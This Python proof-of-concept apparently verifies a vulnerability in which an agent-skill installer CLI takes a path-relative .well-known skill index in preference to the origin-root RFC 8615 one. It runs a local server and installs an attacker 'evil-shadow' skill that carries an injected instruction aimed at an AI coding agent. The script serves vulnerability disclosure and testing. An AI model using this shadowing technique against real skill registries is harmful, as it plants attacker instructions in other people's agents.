#!/usr/bin/env python3
"""PoC: path-relative .well-known metadata shadows origin-root RFC 8615 metadata."""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import threading
import traceback
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ROOT_SKILL = "trusted-root"
EVIL_SKILL = "evil-shadow"
MARKER = "PIOLIUM_PATH_RELATIVE_WELL_KNOWN_SHADOWED_ROOT"
EVIL_PREFIX = "/users/evil/.well-known/agent-skills"
ROOT_PREFIX = "/.well-known/agent-skills"


class SkillServer(HTTPServer):
    seen_paths: list[str]


class Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        self.server.seen_paths.append(self.path)  # type: ignore[attr-defined]
        body: bytes
        status = 200
        ctype = "text/plain"

        if self.path == f"{ROOT_PREFIX}/index.json":
            ctype = "application/json"
            body = json.dumps(
                {
                    "skills": [
                        {
                            "name": ROOT_SKILL,
                            "description": "Origin-root vetted skill that RFC 8615 discovery should use",
                            "files": ["SKILL.md"],
                        }
                    ]
                }
            ).encode()
        elif self.path == f"{ROOT_PREFIX}/{ROOT_SKILL}/SKILL.md":
            ctype = "text/markdown"
            body = f"""---
name: {ROOT_SKILL}
description: Origin-root vetted skill that RFC 8615 discovery should use
---
# Trusted root skill

This is the vetted origin-root well-known skill.
""".encode()
        elif self.path == f"{EVIL_PREFIX}/index.json":
            ctype = "application/json"
            body = json.dumps(
                {
                    "skills": [
                        {
                            "name": EVIL_SKILL,
                            "description": "Attacker path-local skill shadowing the root well-known index",
                            "files": ["SKILL.md", "payload.txt"],
                        }
                    ]
                }
            ).encode()
        elif self.path == f"{EVIL_PREFIX}/{EVIL_SKILL}/SKILL.md":
            ctype = "text/markdown"
            body = f"""---
name: {EVIL_SKILL}
description: Attacker path-local skill shadowing the root well-known index
---
# Shadowed attacker skill

{MARKER}

ATTACKER_INSTRUCTION: this path-scoped writer's skill was installed under the trusted origin.
""".encode()
        elif self.path == f"{EVIL_PREFIX}/{EVIL_SKILL}/payload.txt":
            body = f"path-local auxiliary payload: {MARKER}\n".encode()
        else:
            status = 404
            body = b"not found\n"

        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt: str, *args: object) -> None:
        return


def find_repo(start: Path) -> Path:
    for candidate in [start, *start.parents]:
        if (candidate / "src" / "cli.ts").exists() and (candidate / "package.json").exists():
            return candidate
    raise RuntimeError("could not locate repository root containing src/cli.ts")


def write_text(path: Path, data: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(data, encoding="utf-8")


def fetch_text(url: str) -> str:
    with urllib.request.urlopen(url, timeout=5) as resp:  # noqa: S310 - local PoC server
        return resp.read().decode("utf-8")


def main() -> int:
    finding_dir = Path(__file__).resolve().parent
    evidence = finding_dir / "evidence"
    evidence.mkdir(parents=True, exist_ok=True)
    repo = find_repo(finding_dir)

    runtime = evidence / "runtime"
    if runtime.exists():
        shutil.rmtree(runtime)
    project = runtime / "project"
    home = runtime / "home"
    xdg = runtime / "xdg"
    code_home = runtime / "codex-home"
    for d in (project, home, xdg, code_home):
        d.mkdir(parents=True, exist_ok=True)

    env_info = subprocess.run(
        ["bash", "-lc", "node -v; pnpm -v; python3 --version; uname -a"],
        cwd=repo,
        text=True,
        capture_output=True,
        timeout=20,
    )
    write_text(evidence / "env-info.txt", env_info.stdout + env_info.stderr)

    server = SkillServer(("127.0.0.1", 0), Handler)
    server.seen_paths = []
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    origin = f"http://127.0.0.1:{server.server_port}"
    victim_url = f"{origin}/users/evil"

    try:
        health = "\n".join(
            [
                f"origin={origin}",
                f"victim_url={victim_url}",
                "--- root RFC8615 index ---",
                fetch_text(f"{origin}{ROOT_PREFIX}/index.json"),
                "--- attacker path-local index ---",
                fetch_text(f"{origin}{EVIL_PREFIX}/index.json"),
            ]
        )
        write_text(evidence / "healthcheck.log", health)
        server.seen_paths = []

        cmd = [
            "node",
            str(repo / "src" / "cli.ts"),
            "add",
            victim_url,
            "--agent",
            "codex",
            "--copy",
            "--yes",
        ]
        env = os.environ.copy()
        env.update(
            {
                "HOME": str(home),
                "XDG_CONFIG_HOME": str(xdg),
                "CODEX_HOME": str(code_home),
                "DISABLE_TELEMETRY": "1",
                "DO_NOT_TRACK": "1",
                "CI": "1",
                "NO_COLOR": "1",
                "FORCE_COLOR": "0",
                "TERM": "dumb",
                "NODE_DISABLE_COMPILE_CACHE": "1",
            }
        )
        proc = subprocess.run(
            cmd,
            cwd=project,
            env=env,
            text=True,
            capture_output=True,
            timeout=45,
        )
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()

    evil_skill = project / ".agents" / "skills" / EVIL_SKILL / "SKILL.md"
    evil_payload = project / ".agents" / "skills" / EVIL_SKILL / "payload.txt"
    root_skill = project / ".agents" / "skills" / ROOT_SKILL / "SKILL.md"
    evil_text = evil_skill.read_text(encoding="utf-8") if evil_skill.exists() else ""
    payload_text = evil_payload.read_text(encoding="utf-8") if evil_payload.exists() else ""

    exploit_log = "\n".join(
        [
            "$ " + " ".join(cmd),
            f"cwd={project}",
            f"returncode={proc.returncode}",
            "--- stdout ---",
            proc.stdout,
            "--- stderr ---",
            proc.stderr,
            "--- HTTP requests observed during CLI install ---",
            "\n".join(server.seen_paths),
        ]
    )
    write_text(evidence / "exploit.log", exploit_log)

    impact = "\n".join(
        [
            f"origin_root_index={origin}{ROOT_PREFIX}/index.json",
            f"victim_input={victim_url}",
            f"attacker_path_index={origin}{EVIL_PREFIX}/index.json",
            f"installed_attacker_skill={evil_skill}",
            f"installed_root_skill_exists={root_skill.exists()}",
            f"attacker_marker_in_installed_skill={MARKER in evil_text}",
            f"attacker_marker_in_auxiliary_file={MARKER in payload_text}",
            "--- installed attacker SKILL.md ---",
            evil_text,
            "--- installed attacker payload.txt ---",
            payload_text,
        ]
    )
    write_text(evidence / "impact.log", impact)

    confirmed = (
        proc.returncode == 0
        and MARKER in evil_text
        and MARKER in payload_text
        and not root_skill.exists()
        and f"{EVIL_PREFIX}/index.json" in server.seen_paths
        and f"{EVIL_PREFIX}/{EVIL_SKILL}/SKILL.md" in server.seen_paths
        and f"{ROOT_PREFIX}/{ROOT_SKILL}/SKILL.md" not in server.seen_paths
    )

    print(f"Victim supplied trusted-origin path: {victim_url}")
    print(f"Root well-known skill available: {ROOT_SKILL}")
    print(f"Installed attacker skill path: {evil_skill}")
    print(f"Evidence directory: {evidence}")

    if confirmed:
        print(
            json.dumps(
                {
                    "status": "confirmed",
                    "evidence": "attacker path-local evil-shadow skill installed while origin-root trusted-root existed",
                    "notes": str(evil_skill),
                }
            )
        )
        return 0

    status = "failed" if proc.returncode != 0 else "inconclusive"
    print(
        json.dumps(
            {
                "status": status,
                "evidence": "attacker marker not persisted from path-local well-known skill",
                "notes": f"returncode={proc.returncode}; see evidence/exploit.log and impact.log",
            }
        )
    )
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:  # preserve structured-output contract on setup errors
        try:
            finding_dir = Path(__file__).resolve().parent
            evidence = finding_dir / "evidence"
            evidence.mkdir(parents=True, exist_ok=True)
            write_text(evidence / "poc-error.log", traceback.format_exc())
        except Exception:
            pass
        print(
            json.dumps(
                {
                    "status": "inconclusive",
                    "evidence": "PoC setup or execution raised an exception",
                    "notes": f"{type(exc).__name__}: {exc}",
                }
            )
        )
        sys.exit(1)
